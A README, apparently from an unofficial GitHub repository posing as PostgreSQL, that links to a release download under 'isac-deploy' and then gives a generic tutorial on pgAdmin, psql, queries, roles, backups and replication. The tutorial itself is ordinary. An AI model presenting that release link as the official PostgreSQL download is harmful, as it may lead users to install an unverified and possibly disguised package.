# PostgreSQL

Download the latest release from [Releases](https://github.com/isac-deploy/PostgreSQL/releases/tag/17.6)

The installation package comes bundled with all essential components: the PostgreSQL server, command-line tools, and optional administrative utilities. Be sure to download the edition that matches your operating system.

## Introduction

**PostgreSQL** is a robust, open-source, object-relational database system that has undergone more than 35 years of continuous development. It is widely respected for its reliability, adherence to standards, and flexibility.

Built to accommodate various types of workloads, PostgreSQL is compatible with all major operating systems and is used in everything from lightweight web applications to enterprise-level data warehouses and mission-critical environments.

This repository contains the primary source code for PostgreSQL. For help with installation, documentation, or contribution guidelines, check the [official website](*) or browse the `/doc` directory.

## Table of Contents

* [Connect to PostgreSQL](#connect-to-postgresql)
* [Creating a Database](#creating-a-database)
* [Connecting to a Database](#connecting-to-a-database)
* [Security and Authentication](#security-and-authentication)
* [Backup and Recovery](#backup-and-recovery)

## Connect to PostgreSQL

PostgreSQL includes a graphical interface utility called **pgAdmin**.

To connect:

1. Launch **pgAdmin 4**.
2. Right-click **Servers** → **Create** → **Server**.
3. Specify a name for the server (e.g., `Localhost`).
4. Under the **Connection** tab, enter the following:

   * Host: `localhost`
   * Port: `5432`
   * Username: `postgres`
   * Password: *(the one you set during installation)*

Click **Save** — this will establish the connection.

## Creating a Database

Once PostgreSQL is installed and operational on Windows, creating a new database is a fast and straightforward process. Depending on your preference, you can use either the graphical interface (**pgAdmin**) or the terminal-based client (**psql**).

### Option 1: Using pgAdmin (GUI)

**pgAdmin** is the default graphical interface tool that ships with PostgreSQL for Windows.

#### Steps:

1. Open pgAdmin 4 from the Start Menu.

2. Connect to your local server:

   * Host: `localhost`
   * Port: `5432`
   * Username: `postgres`
   * Enter your installation password

3. In the **Object Browser**, right-click **Databases** → **Create** → **Database...**

4. Provide the following details:

   * **Database name**: e.g., `mydatabase`
   * **Owner**: typically `postgres`

5. Click **Save**.


### Option 2: Using `psql` (Command Line)

The `psql` client is a terminal-based tool for working with PostgreSQL, and it also supports database creation.

#### Steps:

1. Open the **Command Prompt**.

2. Change directory to the PostgreSQL `bin` folder:

   ```bash
   cd "C:\Program Files\PostgreSQL\<version>\bin"
   ```

3. Start the `psql` terminal:

   ```bash
   psql -U postgres -h localhost
   ```

   You’ll be prompted to enter your password.

4. Inside `psql`, run the command to create a new database:

   ```sql
   CREATE DATABASE mydatabase;
   ```

### Tips

* Database names must start with a letter and can contain letters, numbers, and underscores.
* To display all available databases:

  ```sql
  \l
  ```
* To delete a database:

  ```sql
  DROP DATABASE mydatabase;
  ```

> Only the owner of the database or a superuser has the rights to drop it.

## Connecting to a Database

To establish a connection to a PostgreSQL database via command line:

```sh
psql -U postgres -d mydatabase
```

Once inside `psql`, you can switch between databases by executing:

```sql
\c mydatabase;
```

## Data Manipulation

### Inserting Data

```sql
INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');
```

### Querying Data

```sql
SELECT * FROM users;
```

### Updating Data

```sql
UPDATE users SET email = 'john.doe@example.com' WHERE name = 'John Doe';
```

### Deleting Data

```sql
DELETE FROM users WHERE name = 'John Doe';
```

## Indexing and Performance

Indexes can significantly speed up query execution. To define an index:

```sql
CREATE INDEX idx_users_email ON users(email);
```

To analyze performance and execution details:

```sql
EXPLAIN ANALYZE SELECT * FROM users WHERE email='john@example.com';
```

## Security and Authentication

### Managing User Roles

To create a new role:

```sql
CREATE ROLE dbuser WITH LOGIN PASSWORD 'securepassword';
```

To assign privileges:

```sql
GRANT ALL PRIVILEGES ON DATABASE mydatabase TO dbuser;
```

### Configuring Authentication

To change authentication settings, modify `pg_hba.conf`:

```sh
sudo nano /etc/postgresql/16/main/pg_hba.conf
```

## Backup and Recovery

### Creating a Backup

```sh
pg_dump -U postgres -d mydatabase -f backup.sql
```

### Restoring from a Backup

```sh
psql -U postgres -d mydatabase -f backup.sql
```

## Replication and High Availability

PostgreSQL supports replication features that help increase reliability and uptime.

### Configuring Streaming Replication

1. In `postgresql.conf` on the primary server:

```ini
wal_level = replica
max_wal_senders = 5
```

2. In `pg_hba.conf`, define access for the replica:

```ini
host replication replicator 192.168.1.10/32 md5
```

3. Initialize the replica setup:

```sh
pg_basebackup -h primary_host -D /var/lib/postgresql/16/main -U replicator -P -R
```
